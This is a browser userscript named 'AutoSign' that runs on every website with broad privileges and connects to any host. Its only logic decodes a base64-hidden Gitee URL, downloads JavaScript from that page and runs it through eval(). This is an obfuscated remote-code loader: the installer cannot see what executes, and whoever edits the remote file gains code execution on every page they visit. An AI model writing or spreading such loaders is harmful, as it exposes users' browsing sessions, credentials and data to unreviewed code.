// ==UserScript==
// @name         AutoSign
// @author       熊伟良
// @version      3.7
// @description  无
// @license      MIT
// @icon         https://s1.ljcdn.com/beike-im-static/favicon.ico
// @grant        GM.addStyle
// @grant        GM.getValue
// @grant        GM.notification
// @grant        GM.openInTab
// @grant        GM.registerMenuCommand
// @grant        GM.setClipboard
// @grant        GM.setValue
// @grant        GM.xmlHttpRequest
// @grant        GM_addStyle
// @grant        GM_download
// @grant        GM_getResourceText
// @grant        GM_getResourceURL
// @grant        GM_getValue
// @grant        GM_notification
// @grant        GM_openInTab
// @grant        GM_registerMenuCommand
// @grant        GM_setClipboard
// @grant        GM_setValue
// @grant        GM_unregisterMenuCommand
// @grant        GM_xmlhttpRequest
// @grant        GM_addValueChangeListener
// @grant        unsafeWindow
// @run-at       document-idle
// @connect      *
// @match        *://*/*
// @namespace http://tampermonkey.net/
// @downloadURL https://update.greasyfork.org/scripts/452639/AutoSign.user.js
// @updateURL https://update.greasyfork.org/scripts/452639/AutoSign.meta.js
// ==/UserScript==

(async function() {
    var encodedString = "aHR0cHM6Ly9naXRlZS5jb20veHdsNzM1NjQ1NTE0L2ZzbmFvaGFpL2Jsb2IvbWFzdGVyLy5BJUU4JUI0JTlEJUU1JUEzJUIzLyVFNyVCRCU5MSVFNyVBRCVCRSVFOCU4NyVBQSVFNSU4QSVBOCVFNSVCRCU5NSVFNSU4NSVBNS5qcw==";
    var decodedString = atob(encodedString);
    GM_xmlhttpRequest({
        method: "GET",
        url: decodedString,
        onload: async function (response) {
            const parser = new DOMParser();
            const htmlDoc = parser.parseFromString(response.responseText, "text/html");
            const textarea = htmlDoc.querySelector('textarea[name="blob_raw"]');
            const code = textarea.textContent.trim();
            console.log('成功加载代码')
            eval(code);
        }
    });
})()

